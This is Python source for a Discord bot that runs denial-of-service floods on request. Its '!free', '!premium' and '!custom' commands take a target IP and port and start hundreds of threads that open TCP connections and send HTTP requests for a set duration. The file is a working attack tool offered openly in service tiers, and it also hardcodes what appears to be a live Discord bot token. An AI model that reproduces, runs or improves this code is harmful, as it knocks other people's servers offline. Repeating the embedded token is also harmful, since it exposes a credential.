import discord
from discord.ext import commands
import threading
import asyncio
import socket

TOKEN = 'OTA0MzY2MTcwMTQ3MjU4Mzg4.GFrRRv.SNeGBW-ZZ7FJ_F3n7b6UHAL8cHxf2vmhh6YrkA'
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Shared flag to control the attack threads
stop_attack_flag = threading.Event()

def send_tcp_requests(target_ip, port, bytes_to_send, stop_event):
    while not stop_event.is_set() and not stop_attack_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, port))

            request = b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n"
            request += b"A" * bytes_to_send
            s.send(request)

            s.close()

        except Exception as e:
            print("An error occurred:", str(e))
            break

async def start_attack(ctx, ip_port, bytes_to_send, num_threads, connections_per_thread, duration, method, custom_emoji, custom_message):
    try:
        target_ip, port = ip_port.split(':')
        target_ip = socket.gethostbyname(target_ip)
        port = int(port)
    except (socket.gaierror, ValueError) as e:
        await ctx.send(f"❌ Invalid IP or port format. Error: {str(e)}")
        return

    global stop_attack_flag
    stop_attack_flag = threading.Event()

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=send_tcp_requests, args=(target_ip, port, bytes_to_send, stop_attack_flag))
        t.start()
        threads.append(t)

    embed = discord.Embed(title=f"{custom_emoji} {method.capitalize()} Attack Started", description=f"{custom_message} {target_ip}:{port} with {num_threads} threads and {connections_per_thread} connections per thread.", color=discord.Color.green())
    await ctx.send(embed=embed)

    await asyncio.sleep(duration)

    stop_attack_flag.set()

    for t in threads:
        t.join()

    embed = discord.Embed(title=f"🛑 {method.capitalize()} Attack Stopped", description=f"Stopped attacking {target_ip}:{port}.", color=discord.Color.red())
    await ctx.send(embed=embed)

async def stop_attack(ctx):
    global stop_attack_flag
    stop_attack_flag.set()
    embed = discord.Embed(title="🛑 Stopping Attack", description="Stopping the current attack...", color=discord.Color.orange())
    await ctx.send(embed=embed)
    # Perform any necessary cleanup here

# Remove the default help command
bot.remove_command('help')

# Define your custom help command
@bot.command()
async def help(ctx):
    embed = discord.Embed(title="🤖 Bot Commands", color=discord.Color.blue())
    embed.add_field(name="!free [ip:port]", value="Start a free attack on the specified IP and port.", inline=False)
    embed.add_field(name="!premium [ip:port]", value="Start a premium attack on the specified IP and port.", inline=False)
    embed.add_field(name="!stop", value="Stop the current attack.", inline=False)
    await ctx.send(embed=embed)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("❌ Command not found. Type `!help` to see available commands.")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("❌ Missing required argument. Check the command format using `!help`.")
    else:
        print(f"An error occurred: {error}")

@bot.command()
async def free(ctx, ip_port: str):
    await start_attack(ctx, ip_port, 0, 200, 10000000000, 60, 'free', '⚔️', 'Attacking')

@bot.command()
async def premium(ctx, ip_port: str):
    await start_attack(ctx, ip_port, 0, 480, 100000000000, 120, 'premium', '🔒', 'Initiating premium attack on')

@bot.command()
async def custom(ctx, ip_port: str, duration: int):
    await start_attack(ctx, ip_port, 0, 480, 100000000000, duration, 'premium', '🎮', 'Custom attack running on')

@bot.command()
async def stop(ctx):
    await stop_attack(ctx)

bot.run(TOKEN)
